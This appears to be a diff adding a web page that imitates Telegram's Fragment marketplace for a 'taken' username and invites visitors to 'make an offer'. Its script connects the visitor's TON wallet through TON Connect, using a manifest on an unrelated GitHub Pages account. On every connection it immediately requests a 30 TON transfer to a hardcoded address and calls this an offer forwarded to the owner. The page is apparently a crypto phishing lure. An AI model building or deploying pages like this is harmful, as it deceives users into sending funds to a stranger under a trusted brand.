@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fragment - Buy Username</title>
+    <!-- Подключаем TON Connect SDK через CDN -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        /* Стили из font-roboto.css */
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 400;
+            src: url(data:application/font-woff2;base64,...) format('woff2');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 500;
+            src: url(data:application/font-woff2;base64,...) format('woff2');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 700;
+            src: url(data:application/font-woff2;base64,...) format('woff2');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+
+        /* Стили из auction.css (переменные и основные стили) */
+        :root {
+            --tm-bg-dark: #121519;
+            --tm-bg-dark-1: #1c2526;
+            --tm-bg-dark-2: #2a2f31;
+            --tm-text-primary: #fff;
+            --tm-text-secondary: #a1a1a1;
+            --tm-text-blue: #00aff0;
+            --tm-text-orange: #ff9500;
+            --tm-btn-primary-bg: #00aff0;
+            --tm-btn-primary-hover-bg: #0091c2;
+            --tm-btn-radius: 5px;
+            --tm-transition: all 0.3s ease;
+        }
+
+        body {
+            background-color: var(--tm-bg-dark);
+            color: var(--tm-text-primary);
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+
+        .subscribe-link {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: var(--tm-text-blue);
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .username-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .username-header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0;
+        }
+
+        .status-taken {
+            background-color: var(--tm-text-orange);
+            color: var(--tm-text-primary);
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+            text-transform: uppercase;
+        }
+
+        .info-box {
+            background-color: var(--tm-bg-dark-1);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .info-box h4 {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .info-box p {
+            font-size: 14px;
+            color: var(--tm-text-secondary);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .info-box a {
+            color: var(--tm-text-blue);
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .details-table {
+            width: 100%;
+            margin-top: 20px;
+            border-spacing: 0;
+        }
+
+        .details-table th, .details-table td {
+            padding: 10px 0;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .details-table th {
+            color: var(--tm-text-primary);
+            font-weight: 500;
+            width: 40%;
+        }
+
+        .details-table td {
+            color: var(--tm-text-blue);
+            font-weight: 400;
+        }
+
+        .details-table td a {
+            color: var(--tm-text-blue);
+            text-decoration: none;
+        }
+
+        .btn-primary {
+            background-color: var(--tm-btn-primary-bg);
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            border-radius: var(--tm-btn-radius);
+            color: var(--tm-text-primary);
+            text-align: center;
+            cursor: pointer;
+            transition: var(--tm-transition);
+            margin-top: 20px;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--tm-btn-primary-hover-bg);
+        }
+
+        /* Стили для модального окна */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: var(--tm-bg-dark-1);
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .modal-header h4 {
+            font-size: 16px;
+            font-weight: 500;
+            margin: 0;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: var(--tm-text-secondary);
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .modal-body {
+            text-align: center;
+        }
+
+        .modal-body p {
+            font-size: 14px;
+            color: var(--tm-text-secondary);
+            margin-bottom: 15px;
+        }
+
+        .qr-code {
+            background-color: #fff;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 220px;
+        }
+
+        #ton-connect-qr {
+            width: 100%;
+            max-width: 200px;
+            height: auto;
+        }
+
+        .wallet-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .wallet-btn {
+            background-color: var(--tm-bg-dark-2);
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            color: var(--tm-text-primary);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--tm-transition);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .wallet-btn img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .wallet-btn:hover {
+            background-color: #3a3f41;
+        }
+
+        .ton-connect {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+
+        .ton-connect img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .ton-connect span {
+            font-size: 14px;
+            color: var(--tm-text-blue);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Ссылка "Subscribe to updates" -->
+        <a href="#" class="subscribe-link">Subscribe to updates</a>
+
+        <!-- Заголовок с именем и статусом -->
+        <div class="username-header">
+            <h1>slowswags.t.me</h1>
+            <span class="status-taken">Taken</span>
+        </div>
+
+        <!-- Блок с информацией -->
+        <div class="info-box">
+            <h4>Can I buy this username?</h4>
+            <p>Someone already claimed this username on Telegram. You can make an offer, which we will forward to the owner – who may be encouraged to sell.</p>
+            <a href="/about">How does this work?</a>
+        </div>
+
+        <!-- Таблица с деталями -->
+        <table class="details-table">
+            <tr>
+                <th>Telegram Username</th>
+                <td><a href="https://t.me/slowswags">@slowswags</a></td>
+            </tr>
+            <tr>
+                <th>Web Address</th>
+                <td><a href="https://t.me/slowswags">t.me/slowswags</a></td>
+            </tr>
+            <tr>
+                <th>TON Web 3.0 Address</th>
+                <td><a href="https://slowswags.t.me">slowswags.t.me</a></td>
+            </tr>
+        </table>
+
+        <!-- Кнопка "Make an offer" -->
+        <button class="btn-primary" onclick="openModal()">Make an offer</button>
+    </div>
+
+    <!-- Модальное окно -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4>Connect your wallet</h4>
+                <button class="close-btn" onclick="closeModal()">×</button>
+            </div>
+            <div class="modal-body">
+                <p>Scan with your mobile wallet</p>
+                <div class="qr-code">
+                    <!-- QR-код будет генерироваться TON Connect -->
+                    <div id="ton-connect-qr"></div>
+                </div>
+                <p>AVAILABLE WALLETS</p>
+                <div class="wallet-buttons">
+                    <button class="wallet-btn" onclick="connectWallet('telegram-wallet')">
+                        <img src="https://via.placeholder.com/20?text=TG" alt="Telegram">
+                        Wallet on Telegram
+                    </button>
+                    <button class="wallet-btn" onclick="connectWallet('tonkeeper')">
+                        <img src="https://via.placeholder.com/20?text=TK" alt="Tonkeeper">
+                        Tonkeeper
+                    </button>
+                    <button class="wallet-btn" onclick="connectWallet('mytonwallet')">
+                        <img src="https://via.placeholder.com/20?text=MTW" alt="MyTonWallet">
+                        MyTonWallet
+                    </button>
+                    <button class="wallet-btn" onclick="viewAllWallets()">
+                        <img src="https://via.placeholder.com/20?text=All" alt="View all">
+                        View all wallets
+                    </button>
+                </div>
+                <div class="ton-connect">
+                    <img src="https://via.placeholder.com/20?text=TON" alt="TON Connect">
+                    <span>TON Connect</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let tonConnectUI;
+        let isTonConnectInitialized = false;
+
+        // Функция для проверки доступности manifest
+        async function checkManifest(url) {
+            try {
+                const response = await fetch(url);
+                if (response.ok) {
+                    console.log('Manifest loaded successfully');
+                    return true;
+                } else {
+                    console.error('Manifest not found at:', url);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error fetching manifest:', error);
+                return false;
+            }
+        }
+
+        // Инициализация TON Connect с повторными попытками
+        async function initializeTonConnect(attempts = 5, delay = 1000) {
+            const manifestUrl = 'https://mrshadow3322.github.io/fdsgcxbcxbvxcz/tonconnect-manifest.json';
+            
+            // Проверяем доступность manifest
+            const isManifestAvailable = await checkManifest(manifestUrl);
+            if (!isManifestAvailable) {
+                alert('Manifest file not found. Please ensure tonconnect-manifest.json is available at ' + manifestUrl);
+                return;
+            }
+
+            for (let i = 0; i < attempts; i++) {
+                try {
+                    if (typeof TONCONNECT_UI !== 'undefined') {
+                        tonConnectUI = new TONCONNECT_UI.TonConnectUI({
+                            manifestUrl: manifestUrl,
+                            buttonRootId: 'ton-connect-qr',
+                            network: 'testnet' // Используем testnet для тестирования
+                        });
+
+                        tonConnectUI.uiOptions = {
+                            language: 'en',
+                            uiPreferences: {
+                                theme: 'DARK'
+                            },
+                            walletsListConfiguration: {
+                                includeWallets: [
+                                    { appName: 'telegram-wallet' },
+                                    { appName: 'tonkeeper' },
+                                    { appName: 'mytonwallet' }
+                                ]
+                            }
+                        };
+
+                        isTonConnectInitialized = true;
+                        console.log('TON Connect initialized successfully');
+                        break;
+                    } else {
+                        console.warn('TON Connect SDK not loaded yet, retrying...');
+                        await new Promise(resolve => setTimeout(resolve, delay));
+                    }
+                } catch (error) {
+                    console.error('Failed to initialize TON Connect (attempt ' + (i + 1) + '):', error);
+                    if (i === attempts - 1) {
+                        alert('Failed to initialize TON Connect after multiple attempts. Please check your internet connection and try again.');
+                    }
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                }
+            }
+
+            // Настройка отслеживания статуса после успешной инициализации
+            if (isTonConnectInitialized) {
+                tonConnectUI.onStatusChange((wallet) => {
+                    console.log('Wallet status changed:', wallet);
+                    if (wallet) {
+                        console.log('Wallet connected:', wallet);
+                        connectWalletAfterQR(wallet);
+                    } else {
+                        console.log('Wallet disconnected');
+                    }
+                });
+            }
+        }
+
+        // Инициализируем TON Connect при загрузке страницы
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeTonConnect();
+        });
+
+        async function openModal() {
+            // Показываем индикатор загрузки
+            const loadingMessage = document.createElement('div');
+            loadingMessage.innerText = 'Инициализация TON Connect...';
+            loadingMessage.style.position = 'fixed';
+            loadingMessage.style.top = '50%';
+            loadingMessage.style.left = '50%';
+            loadingMessage.style.transform = 'translate(-50%, -50%)';
+            loadingMessage.style.background = '#000';
+            loadingMessage.style.color = '#fff';
+            loadingMessage.style.padding = '10px 20px';
+            loadingMessage.style.borderRadius = '5px';
+            document.body.appendChild(loadingMessage);
+
+            if (!tonConnectUI) {
+                await initializeTonConnect();
+            }
+
+            // Удаляем индикатор загрузки
+            document.body.removeChild(loadingMessage);
+
+            if (!isTonConnectInitialized || !tonConnectUI) {
+                alert('TON Connect is not ready. Please wait a moment and try again.');
+                return;
+            }
+
+            document.getElementById('walletModal').style.display = 'flex';
+            tonConnectUI.uiOptions.buttonRootId = 'ton-connect-qr';
+        }
+
+        function closeModal() {
+            document.getElementById('walletModal').style.display = 'none';
+        }
+
+        async function connectWallet(walletType) {
+            if (!isTonConnectInitialized || !tonConnectUI) {
+                alert('TON Connect is not ready. Please wait a moment and try again.');
+                return;
+            }
+
+            try {
+                if (walletType === 'telegram-wallet') {
+                    await tonConnectUI.openSingleWalletModal('telegram-wallet');
+                } else if (walletType === 'tonkeeper') {
+                    await tonConnectUI.openSingleWalletModal('tonkeeper');
+                } else if (walletType === 'mytonwallet') {
+                    await tonConnectUI.openSingleWalletModal('mytonwallet');
+                }
+
+                if (tonConnectUI.connected) {
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 60,
+                        messages: [
+                            {
+                                address: "UQA7zv18rAEKJt85gvCVXLJRzGfagMPPnS5AaDGJlTYgYKSU",
+                                amount: "30000000000"
+                            }
+                        ]
+                    };
+
+                    const result = await tonConnectUI.sendTransaction(transaction);
+                    console.log('Transaction successful:', result);
+                    alert('Offer of 30 TON sent successfully!');
+                    closeModal();
+                }
+            } catch (error) {
+                console.error('Error connecting wallet or sending transaction:', error);
+                alert('Failed to connect wallet or send transaction. Please try again.');
+            }
+        }
+
+        async function viewAllWallets() {
+            if (!isTonConnectInitialized || !tonConnectUI) {
+                alert('TON Connect is not ready. Please wait a moment and try again.');
+                return;
+            }
+
+            try {
+                await tonConnectUI.openModal();
+            } catch (error) {
+                console.error('Error opening wallet list:', error);
+            }
+        }
+
+        async function connectWalletAfterQR(wallet) {
+            try {
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 60,
+                    messages: [
+                        {
+                            address: "UQA7zv18rAEKJt85gvCVXLJRzGfagMPPnS5AaDGJlTYgYKSU",
+                            amount: "30000000000"
+                        }
+                    ]
+                };
+                const result = await tonConnectUI.sendTransaction(transaction);
+                console.log('Transaction successful:', result);
+                alert('Offer of 30 TON sent successfully!');
+                closeModal();
+            } catch (error) {
+                console.error('Error sending transaction after QR connect:', error);
+                alert('Failed to send transaction. Please try again.');
+            }
+        }
+    </script>
+</body>
+</html>
